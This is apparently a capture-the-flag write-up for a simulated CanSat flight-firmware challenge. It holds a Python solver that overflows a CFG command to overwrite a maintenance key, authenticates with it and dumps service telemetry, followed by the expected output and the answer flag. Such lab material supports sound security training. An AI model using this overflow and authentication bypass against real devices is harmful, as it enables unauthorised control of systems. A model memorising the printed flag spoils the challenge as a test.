# 305-satellite-sabotage-sim

| | |
|---|---|
| **Category** | 03 — Orbital Oops at Mission Control |
| **Points** | 125 |

## Description

This is where the theft was always heading. With the board understood, the intruder's last move was the flight computer itself — the Foundation One CanSat. We have the flight firmware on a bench rig that speaks the same command link the real unit does over its radio. The question the team is asking: could someone on that link make the CanSat say something it was never meant to say?

The rig takes the same uplink frames the CanSat accepts in flight. Most of them are harmless — ping it, read its telemetry. One of them is not as careful as it looks about how much it is handed, and there is a service page the firmware will only show once it believes you are maintenance. The exposed service header on the board was not a coincidence. Make the firmware believe you, and read the page it is hiding.

Get the CanSat to dump its service telemetry.

**Flag format:** `GAIANSPACE{...}`

**Attachments:**
- `foundation_one_fw.py` — the flight firmware, running on the bench rig
- `Dockerfile, docker-compose.yml` — to stand the rig up yourself

## Solution

### Steps

Exploit the CFG input length to overwrite the maintenance service key, authenticate with the chosen key, and request the DUMP command.

### Reproduction

Run the supplied solver with the original challenge inputs in the paths expected by the source code.

Start the firmware service in the first terminal:

```bash
python3 foundation_one_fw.py
```

Then run the exploit in a second terminal:

```bash
python3 305.py
```

Expected relevant output:

```text
Foundation One CanSat link up. HELP for commands.
CFG 0000000000000000000000000000000041424344: CFG LOADED 20 bytes
AUTH 41424344: MAINT OK
DUMP: SVC TLM imu=A3387 co2=A5190 radio=A4075 payload=GAIANSPACE{c4nsat_t3lemetry_pwn3d}

FLAG: GAIANSPACE{c4nsat_t3lemetry_pwn3d}
```

### Exploit Code

```python

#!/usr/bin/env python3
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9707

# Overwrite the service key at offsets 16 through 19.
new_key = b"ABCD"
payload = bytes(16) + new_key

commands = [
    b"CFG " + payload.hex().encode("ascii"),
    b"AUTH " + new_key.hex().encode("ascii"),
    b"DUMP",
]

with socket.create_connection((HOST, PORT), timeout=10) as sock:
    stream = sock.makefile("rb")

    print(stream.readline().decode("ascii").strip())

    for command in commands:
        sock.sendall(command + b"\n")
        response = stream.readline().decode("ascii").strip()
        print(f"{command.decode('ascii')}: {response}")

        if command.startswith(b"AUTH ") and response != "MAINT OK":
            raise RuntimeError("Authentication failed")

        if command == b"DUMP":
            match = re.search(r"GAIANSPACE\{[^}]+\}", response)
            if match is None:
                raise RuntimeError("Flag not found")
            print(f"\nFLAG: {match.group(0)}")
```

## Flag

```text
GAIANSPACE{c4nsat_t3lemetry_pwn3d}
```
